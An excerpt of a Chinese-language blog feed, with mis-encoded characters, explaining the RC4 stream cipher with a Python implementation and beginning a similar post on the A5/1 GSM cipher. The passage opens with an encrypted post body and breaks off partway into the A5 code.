cOzz44qqRqSNsp6Q7hze0RP0GCfM7hDaaXzvrEcVlT/m9NSDZa571XDT4W/HaoVL/qjXv/vkDwXUPyuZnEIZNoQ9PkIycadaeWZPAvlXcW5Hwagn0XqPZ0lwnBtt9525TwrOLlPgheBBVZr7bTZfyv5IjSf9xnzPRf4ik3+Ga5UebC8UpGO1p0cRVpegQIh54Ks0pkU8EhPrAtCS0IgtKNMwl3EqxfYwNt7oskQrHpmHqPTcT6t9/pChFk/Ncd77C7AniKOisDmf7vbHO/Emh1C6rp9Pku3sgnW529uIIXz+QDpRoxZLW95W81Hw3o0ZtKzEffSsMULhTAMvgZdTLRwjuEY4H+BhudNlnytHBP1cpXYxhO4O+Dg8vns8lIBg8Wug2RTIhz5J1HqleA9XK4EOR6SGUFo7iv0QXceKG8HK+/RzinWkXQLsAPoHfMB7RTiz/OvFLxegUHlh3pLR1Zl2bZPwZiIEW8tI0OxY+RVfIQeUZnpicMVyG8OxGug2MLDcwjhB4BAD928ggejkads2TWiSlrQvR+C2hTxoVJMOafEMNEtul0GUy9lygTQtH8JR2YgVqLVEjTphNRK3VQNiXRY7lR7L6FHhohG22ma3KbdxmuibBg6AyxxZKuy/i3EyJ0l1wAtxXlS/3WCGndq+JaEY+a5hj/wj/mjJNrfOQnn/FRSDDfbHWDUiN8+SqefhQynoCk2B49tPPEb8P1Rnbd9y89J2aWpTvorMqE1qpLuQ4Nhhdg9jo7DXDIJ0Z8yfI1ubphR3RafhKpyGGtgEVJBHtf9TDrQiV8TtLSwnFvn5puVrKaslYt4e3JU4xiDa9ZebSWN3SvdWcVe+8ydG1i9EbcHmQfAItNyYy8kV0JxKp/qykdtAA8T3YJ/HIERc5U3LCUGLoYmFCSmxBHOLBFK85B/mxC1FME7uJsjFamaHPM5xTtENcOprfNWtx8NGOmfhHG6jeDStGxePX9sEAfHnlyN6Y7cH8wy8WPfqOBwAhgPfGxdyQ/GkfYdyombb4u20bRWxRRSfC37vbvS+Vxwo13kgtW2f6QAni31je9+WyRKOQQrUtBHMFz/DsVH0lEgCvmC9+KOmW+NQ02i9KsOSwPou+tDv8EKOrr4Uwc9pSnxFAw3bd5ysLwh1tJB3Taxu6VCX3thGWhhFDj4epn2zyMH9J6XRXdnbAyIZPrWDrqEMGcEGkIF8NCaxRWOc6Mi8yQcgN+IrjLPnO7MeOl/NHJCetFDuktk/QneGWZao2uajWSlCXsUUGELH/xLRqIaipjScuNfGZJPgSpK2+Xewrb4BF+ohIaWHrvQgOtCKtuWtt8goF40dS0UjczXxzlqgOID9MIV3ZrKrK92TQTmC8lsTbtHORYWKDHVkGxZS6isrkrhj8eUheRuB6qkfA== </div>]]></content>
      
      <categories>
          
          <category> éšç¬” </category>
          
      </categories>
      
      
        <tags>
            
            <tag> éšç¬” </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>RC4çš„åŸç†åŠpythonå®ç°</title>
      <link href="/RC4-python.html"/>
      <url>/RC4-python.html</url>
      <content type="html"><![CDATA[<h3 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h3><p>RC4ï¼ˆæ¥è‡ªRivest Cipher 4çš„ç¼©å†™ï¼‰æ˜¯ä¸€ç§æµåŠ å¯†ç®—æ³•ï¼Œå¯†é’¥é•¿åº¦å¯å˜ã€‚<a id="more"></a>å®ƒåŠ è§£å¯†ä½¿ç”¨ç›¸åŒçš„å¯†é’¥ï¼Œ<code>ä¸€ä¸ªå­—èŠ‚ä¸€ä¸ªå­—èŠ‚</code>åœ°åŠ å¯†ã€‚å› æ­¤ä¹Ÿå±äºå¯¹ç§°åŠ å¯†ç®—æ³•ã€‚çªå‡ºä¼˜ç‚¹æ˜¯åœ¨è½¯ä»¶é‡Œé¢å¾ˆå®¹æ˜“å®ç°ã€‚</p><h3 id="åŠ å¯†æµç¨‹"><a href="#åŠ å¯†æµç¨‹" class="headerlink" title="åŠ å¯†æµç¨‹"></a>åŠ å¯†æµç¨‹</h3><p>åŒ…å«ä¸¤ä¸ªå¤„ç†è¿‡ç¨‹ï¼šä¸€æ˜¯ç§˜é’¥è°ƒåº¦ç®—æ³•(KSA)ï¼Œç”¨äºä¹‹ä¹±Sç›’çš„åˆå§‹æ’åˆ—ï¼Œå¦å¤–ä¸€ä¸ªæ˜¯ä¼ªéšæœºæ•°ç”Ÿæˆç®—æ³•(PRGA)ï¼Œç”¨æ¥è¾“å‡ºéšæœºåºåˆ—å¹¶ä¿®æ”¹Sçš„å½“å‰é¡ºåºã€‚</p><ol><li>æ ¹æ®ç§˜é’¥ç”ŸæˆSç›’</li><li>åˆ©ç”¨PRGAç”Ÿæˆç§˜é’¥æµ</li><li>ç§˜é’¥ä¸æ˜æ–‡å¼‚æˆ–äº§ç”Ÿå¯†æ–‡</li></ol><p>å•ä¸ªç‚¹æ‹¿å‡ºæ¥åˆ†æ</p><h4 id="æ ¹æ®ç§˜é’¥ç”ŸæˆSç›’"><a href="#æ ¹æ®ç§˜é’¥ç”ŸæˆSç›’" class="headerlink" title="æ ¹æ®ç§˜é’¥ç”ŸæˆSç›’"></a>æ ¹æ®ç§˜é’¥ç”ŸæˆSç›’</h4><p>åˆå§‹åŒ–Sç›’</p><p>ç›´æ¥æ„é€ ä¸€ä¸ªS[256]ï¼Œéå†0~255ï¼Œç„¶ååˆ›å»ºä¸´æ—¶T[256]ï¼Œç”¨äºå­˜å‚¨ç§å­ç§˜é’¥ï¼Œé•¿åº¦ä¸å¤Ÿå¾ªç¯å¡«å……ç›´åˆ°Tè¢«å¡«æ»¡ï¼Œæ ¹æ®T[i]å°†S[i]ä¸Sä¸­çš„å¦å¤–ä¸€ä¸ªå­—èŠ‚å¯¹æ¢ï¼Œå¯¹Sçš„æ“ä½œä»…ä»…æ˜¯äº¤æ¢ï¼Œå”¯ä¸€æ”¹å˜çš„æ˜¯ä½ç½®ï¼Œä½†é‡Œé¢çš„å…ƒç´ æ˜¯æ²¡å˜çš„è¿˜æ˜¯0~255</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">s_box = list(range(<span class="number">256</span>)) <span class="comment">#æˆ‘è¿™é‡Œæ²¡ç®¡ç§˜é’¥å°äº256çš„æƒ…å†µï¼Œå°äº256ä¸æ–­é‡å¤å¡«å……å³å¯</span></span><br><span class="line">j = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">    j = (j + s_box[i] + ord(key[i % len(key)])) % <span class="number">256</span></span><br><span class="line">    s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line"><span class="comment">#print(type(s_box)) #for_test</span></span><br><span class="line"><span class="keyword">return</span> s_box</span><br></pre></td></tr></table></figure><p>ä¸‹å›¾å¾ˆå¥½çš„è§£é‡Šäº†Sç›’è¢«éšæœºåŒ–çš„è¿‡ç¨‹</p><p><img src="https://s1.ax1x.com/2018/12/23/FyoTbQ.png" alt="FyoTbQ.png"></p><h4 id="åˆ©ç”¨PRGAç”Ÿæˆç§˜é’¥æµ"><a href="#åˆ©ç”¨PRGAç”Ÿæˆç§˜é’¥æµ" class="headerlink" title="åˆ©ç”¨PRGAç”Ÿæˆç§˜é’¥æµ"></a>åˆ©ç”¨PRGAç”Ÿæˆç§˜é’¥æµ</h4><p>ä»Sç›’é€‰å–ä¸€ä¸ªå…ƒç´ è¾“å‡ºï¼Œå¹¶ç½®æ¢Sç›’ä¾¿äºä¸‹ä¸€è½®å–å‡ºï¼Œé€‰å–è¿‡ç¨‹å–å†³äºç´¢å¼•iå’Œjï¼Œè¿™ä¹Ÿä½“ç°äº†åœ¨åŠ å¯†è¿‡ç¨‹ä¸­Sç›’ä¼šå˜åŒ–ã€‚ä¸‹é¢çš„æ˜¯æµç¨‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">res = []</span><br><span class="line">i = j =<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> plain:</span><br><span class="line">    i = (i + <span class="number">1</span>) %<span class="number">256</span></span><br><span class="line">    j = (j + box[i]) %<span class="number">256</span></span><br><span class="line">    box[i], box[j] = box[j], box[i]</span><br><span class="line">    t = (box[i] + box[j])% <span class="number">256</span></span><br><span class="line">    k = box[t]</span><br><span class="line">    res.append(chr(ord(s)^k))  <span class="comment">#ç›´æ¥ä¸æ¯ä¸€ä¸ªå­—èŠ‚æ˜æ–‡ç›¸å¼‚æˆ–</span></span><br></pre></td></tr></table></figure><h4 id="ç§˜é’¥ä¸æ˜æ–‡å¼‚æˆ–äº§ç”Ÿå¯†æ–‡"><a href="#ç§˜é’¥ä¸æ˜æ–‡å¼‚æˆ–äº§ç”Ÿå¯†æ–‡" class="headerlink" title="ç§˜é’¥ä¸æ˜æ–‡å¼‚æˆ–äº§ç”Ÿå¯†æ–‡"></a>ç§˜é’¥ä¸æ˜æ–‡å¼‚æˆ–äº§ç”Ÿå¯†æ–‡</h4><p>è‡³äºè¿™ä¸€ç‚¹å°±ä¸ç”¨å¤šè¯´äº†ï¼Œç”±äºå¼‚æˆ–è¿ç®—çš„å¯¹åˆæ€§ï¼ŒRC4åŠ å¯†è§£å¯†ä½¿ç”¨åŒä¸€å¥—ç®—æ³•ã€‚</p><h4 id="pythonå®ç°ï¼š"><a href="#pythonå®ç°ï¼š" class="headerlink" title="pythonå®ç°ï¼š"></a>pythonå®ç°ï¼š</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># Author:0verWatch</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_message</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"è¾“å…¥ä½ çš„ä¿¡æ¯ï¼š"</span>)</span><br><span class="line">    s = input()</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_key</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"è¾“å…¥ä½ çš„ç§˜é’¥ï¼š"</span>)</span><br><span class="line">    key = input()</span><br><span class="line">    <span class="keyword">if</span> key == <span class="string">''</span>:</span><br><span class="line">        key = <span class="string">'none_public_key'</span></span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init_box</span><span class="params">(key)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Sç›’ </span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    s_box = list(range(<span class="number">256</span>)) <span class="comment">#æˆ‘è¿™é‡Œæ²¡ç®¡ç§˜é’¥å°äº256çš„æƒ…å†µï¼Œå°äº256åº”è¯¥ä¸æ–­é‡å¤å¡«å……å³å¯</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        j = (j + s_box[i] + ord(key[i % len(key)])) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">    <span class="comment">#print(type(s_box)) #for_test</span></span><br><span class="line">    <span class="keyword">return</span> s_box</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ex_encrypt</span><span class="params">(plain,box,mode)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    åˆ©ç”¨PRGAç”Ÿæˆç§˜é’¥æµå¹¶ä¸å¯†æ–‡å­—èŠ‚å¼‚æˆ–ï¼ŒåŠ è§£å¯†åŒä¸€ä¸ªç®—æ³•</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> mode == <span class="string">'2'</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">            c_mode = input(<span class="string">"è¾“å…¥ä½ çš„è§£å¯†æ¨¡å¼:Base64 or ordinary\n"</span>)</span><br><span class="line">            <span class="keyword">if</span> c_mode == <span class="string">'Base64'</span>:</span><br><span class="line">                plain = base64.b64decode(plain)</span><br><span class="line">                plain = bytes.decode(plain)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">elif</span> c_mode == <span class="string">'ordinary'</span>:</span><br><span class="line">                plain = plain</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">"Something Wrong,è¯·é‡æ–°æ–°è¾“å…¥"</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    res = []</span><br><span class="line">    i = j =<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> plain:</span><br><span class="line">        i = (i + <span class="number">1</span>) %<span class="number">256</span></span><br><span class="line">        j = (j + box[i]) %<span class="number">256</span></span><br><span class="line">        box[i], box[j] = box[j], box[i]</span><br><span class="line">        t = (box[i] + box[j])% <span class="number">256</span></span><br><span class="line">        k = box[t]</span><br><span class="line">        res.append(chr(ord(s)^k))</span><br><span class="line"></span><br><span class="line">    cipher = <span class="string">""</span>.join(res)</span><br><span class="line">    <span class="comment">#print(cipher)</span></span><br><span class="line">    <span class="keyword">if</span>  mode == <span class="string">'1'</span>:</span><br><span class="line">        <span class="comment"># åŒ–æˆå¯è§†å­—ç¬¦éœ€è¦ç¼–ç </span></span><br><span class="line">        print(<span class="string">"åŠ å¯†åçš„è¾“å‡º(æ²¡ç»è¿‡ä»»ä½•ç¼–ç ):"</span>)</span><br><span class="line">        print(cipher)</span><br><span class="line">        <span class="comment"># base64çš„ç›®çš„ä¹Ÿæ˜¯ä¸ºäº†å˜æˆå¯è§å­—ç¬¦</span></span><br><span class="line">        print(<span class="string">"base64åçš„ç¼–ç :"</span>)</span><br><span class="line">        print(str(base64.b64encode(cipher.encode(<span class="string">'utf-8'</span>)),<span class="string">'utf-8'</span>))</span><br><span class="line">    <span class="keyword">if</span> mode == <span class="string">'2'</span>:</span><br><span class="line">        print(<span class="string">"è§£å¯†åçš„å¯†æ–‡ï¼š"</span>)</span><br><span class="line">        print(cipher)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_mode</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"è¯·é€‰æ‹©åŠ å¯†æˆ–è€…è§£å¯†"</span>)</span><br><span class="line">    print(<span class="string">"1. Encrypt"</span>)</span><br><span class="line">    print(<span class="string">"2. Decode"</span>)</span><br><span class="line">    mode = input()</span><br><span class="line">    <span class="keyword">if</span> mode == <span class="string">'1'</span>:</span><br><span class="line">        message = get_message()</span><br><span class="line">        key = get_key()</span><br><span class="line">        box = init_box(key)</span><br><span class="line">        ex_encrypt(message,box,mode)</span><br><span class="line">    <span class="keyword">elif</span> mode == <span class="string">'2'</span>:</span><br><span class="line">        message = get_message()</span><br><span class="line">        key = get_key()</span><br><span class="line">        box = init_box(key)</span><br><span class="line">        ex_encrypt(message, box, mode)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"è¾“å…¥æœ‰è¯¯ï¼"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        get_mode()</span><br></pre></td></tr></table></figure><h3 id="å®‰å…¨æ€§"><a href="#å®‰å…¨æ€§" class="headerlink" title="å®‰å…¨æ€§"></a>å®‰å…¨æ€§</h3><ol><li>ç”±äºRC4ç®—æ³•åŠ å¯†æ˜¯é‡‡ç”¨çš„xorï¼Œæ‰€ä»¥ï¼Œä¸€æ—¦å­å¯†é’¥åºåˆ—å‡ºç°äº†é‡å¤ï¼Œå¯†æ–‡å°±æœ‰å¯èƒ½è¢«ç ´è§£ã€‚æ‰€ä»¥å¿…é¡»å¯¹åŠ å¯†å¯†é’¥è¿›è¡Œæµ‹è¯•ï¼Œåˆ¤æ–­å…¶æ˜¯å¦ä¸ºå¼±å¯†é’¥ã€‚</li><li>å½“ç„¶ï¼Œç°åœ¨RC4å·²ç»ä¸å®‰å…¨äº†ï¼Œå¯ä»¥å‚è€ƒè¿™ç¯‡<a href="https://arstechnica.com/information-technology/2015/07/once-theoretical-crypto-attack-against-https-now-verges-on-practicality/" target="_blank" rel="noopener">æ–‡ç« </a>ï¼Œç ´è§£RC4ç°åœ¨æ˜¯å…·æœ‰å¾ˆé«˜æ•ˆç‡çš„ã€‚</li></ol>]]></content>
      
      <categories>
          
          <category> å¯†ç å­¦ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å¯†ç å­¦ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>A5çš„åŸç†åŠpythonå®ç°</title>
      <link href="/A5-python.html"/>
      <url>/A5-python.html</url>
      <content type="html"><![CDATA[<p>æœ€è¿‘è¦åšå¯†ç å­¦è¯¾ç¨‹è®¾è®¡ï¼Œæ¯åšä¸€ä¸ªå¯†ç å°±å½“å¤ä¹ ä¸€ä¸‹ï¼ŒæŠŠç®—æ³•åŸç†å•¥çš„éƒ½è¿‡ä¸€é<a id="more"></a>å§</p><h3 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h3><p>è¿™ä¸ªæ˜¯ç”¨äºGSMç³»ç»Ÿçš„åºåˆ—å¯†ç ç®—æ³•ï¼ŒA5çš„ç‰¹ç‚¹æ˜¯æ•ˆç‡é«˜ï¼Œé€‚åˆç¡¬ä»¶ä¸Šé«˜æ•ˆå®ç°ã€‚</p><h3 id="åŠ å¯†è¿‡ç¨‹"><a href="#åŠ å¯†è¿‡ç¨‹" class="headerlink" title="åŠ å¯†è¿‡ç¨‹"></a>åŠ å¯†è¿‡ç¨‹</h3><ol><li>A5 / 1åŸºäºä¸‰ä¸ªçº¿æ€§åé¦ˆç§»ä½å¯„å­˜å™¨LFSRçš„ç»„åˆï¼Œä¸‰ä¸ªå¯„å­˜å™¨çš„é•¿åº¦åˆ†åˆ«ä¸º 19 22 23ä½ï¼Œç„¶åäº§ç”Ÿä¸€ä¸ª114ä½çš„ç§˜é’¥æµã€‚å› æ­¤é¦–å…ˆè¾“å…¥8ä¸ªå­—èŠ‚çš„ç§˜é’¥å»å¡«å……ä¸‰ä¸ªå¯„å­˜å™¨çš„æ€»é•¿ä¹Ÿå°±æ˜¯64ä½ã€‚</li><li>æ¯æ¬¡è·å–å„å¯„å­˜å™¨çš„æœ€åä¸€ä½ç›¸äº’å¼‚æˆ–ä¸€ä¸‹å†ä¸æ˜æ–‡è¿›è¡Œå¼‚æˆ–ã€‚ä»è¿™ä¸€ç‚¹è¿˜æ˜¯å¯ä»¥çœ‹å‡ºå…³é”®ç‚¹åœ¨äºç§˜é’¥ï¼Œå¼‚æˆ–äº†ä¸¤éåŸä¿¡æ¯ä¸€è‡´ï¼Œæ‰€ä»¥åŠ å¯†è§£å¯†éƒ½æ˜¯ä¸€æ ·çš„ç®—æ³•äº†ã€‚</li><li>ç„¶åæ ¹æ®å¯„å­˜å™¨çš„æŸä¸€ä½å†³å®šæ˜¯å¦éœ€è¦å¯¹æŸä¸ªå‚¨å­˜å™¨è¿›è¡Œç§»ä½ï¼Œå­˜åœ¨çš„æ•°æ®å¤šçš„å†³å®š</li></ol><p>å¼•ç”¨ç»´åŸºç™¾ç§‘çš„ä¸€ä¸ªå›¾ï¼Œè¿™ä¸ªå›¾å¾ˆå¥½çš„æ­ç¤ºäº†åŠ å¯†çš„æµç¨‹</p><p><img src="https://s1.ax1x.com/2018/12/22/FyME6I.png" alt="FyME6I.png"></p><p>æ€»ç»“è¦æ³¨æ„çš„åŠ å¯†çš„å‡ ä¸ªç‚¹ï¼š</p><h4 id="äº§ç”Ÿç§˜é’¥æµ"><a href="#äº§ç”Ÿç§˜é’¥æµ" class="headerlink" title="äº§ç”Ÿç§˜é’¥æµ"></a>äº§ç”Ÿç§˜é’¥æµ</h4><ol><li>æ ¹æ®8ä½ç§˜é’¥äº§ç”Ÿçš„64ä½äºŒè¿›åˆ¶å¡«å……å¯„å­˜å™¨</li><li>è¾“å‡ºç§˜é’¥æµï¼Œæ¯ä¸€ä½éƒ½éµå¾ª<code>Z1[18]^Z2[21]^Z3[22]</code>è¿™æ ·çš„æµç¨‹ï¼Œæˆ‘ä»¬éœ€è¦æ³¨æ„çš„æ˜¯è¿™é‡Œè®²åºåˆ—å¯†ç çš„æ—¶å€™ç”¨<code>+</code>è¡¨ç¤ºçš„éƒ½æ˜¯å¼‚æˆ–</li><li>ç„¶åå°±ç»è¿‡114è½®è¿­ä»£ï¼Œå°±å¯ä»¥äº§ç”Ÿ114ä½ç§˜é’¥å•¦</li></ol><h4 id="å¯„å­˜å™¨åé¦ˆ"><a href="#å¯„å­˜å™¨åé¦ˆ" class="headerlink" title="å¯„å­˜å™¨åé¦ˆ"></a>å¯„å­˜å™¨åé¦ˆ</h4><p>éµå¾ªâ€œæœä»å¤šæ•°â€çš„åŸåˆ™ï¼Œä»æ¯ä¸ªå¯„å­˜å™¨é‡Œé¢å–å‡ºä¸€ä¸ªä¸­é—´ä½(ä¸Šå›¾æ ‡é»„çš„ä½ç½®)è¿›è¡Œè¿ç®—ï¼Œå–å‡ºçš„3ä¸ªä¸­é—´ä½é‡Œé¢è‡³å°‘æœ‰ä¸¤ä¸ª1ï¼Œåˆ™ä¸­é—´ä½ä¸º1çš„å°±è¿›è¡Œç§»ä½ï¼Œä¸º0çš„å°±ä¸ç§»ä½ï¼Œåä¹‹è‡³å°‘ä¸¤ä¸ªä¸º0ï¼Œåˆ™ä¸º0çš„è¿›è¡Œä¸€æ¬¡ä½ç§»ï¼Œä¸º1çš„å°±ä¸ç§»ä½äº†ï¼Œä¿è¯äº†æ¯æ¬¡è‡³å°‘æœ‰äº†ä¸¤ä¸ªLFSRè¢«é©±åŠ¨ç§»ä½äº†ã€‚</p><h4 id="ç”Ÿæˆçš„è¡¥å……å€¼"><a href="#ç”Ÿæˆçš„è¡¥å……å€¼" class="headerlink" title="ç”Ÿæˆçš„è¡¥å……å€¼"></a>ç”Ÿæˆçš„è¡¥å……å€¼</h4><p>è¡¥å……å€¼ç”±æŸäº›æŠ½å¤´ä½è¿›è¡Œå¼‚æˆ–è¿ç®—çš„ç»“æœå†³å®šï¼Œè¿ç®—ç»“æœä¸º1åˆ™è¡¥å……ä¸º1ï¼Œå¦åˆ™è¡¥å……0,3ä¸ªLFSRé‡Œçš„æŠ½å¤´ä½å¦‚ä¸‹å›¾ï¼Œä½†æ˜¯è¡¥å……çš„å‰ææ˜¯åˆå¯„å­˜å™¨åé¦ˆå†³å®šçš„</p><p><img src="https://s1.ax1x.com/2018/12/22/FyG33F.png" alt="FyG33F.png"></p><h4 id="pythonå®ç°ï¼š"><a href="#pythonå®ç°ï¼š" class="headerlink" title="pythonå®ç°ï¼š"></a>pythonå®ç°ï¼š</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># Author:0verWatch</span></span><br><span class="line"></span><br><span class="line">X = <span class="string">''</span></span><br><span class="line">Y = <span class="string">''</span></span><br><span class="line">Z = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span 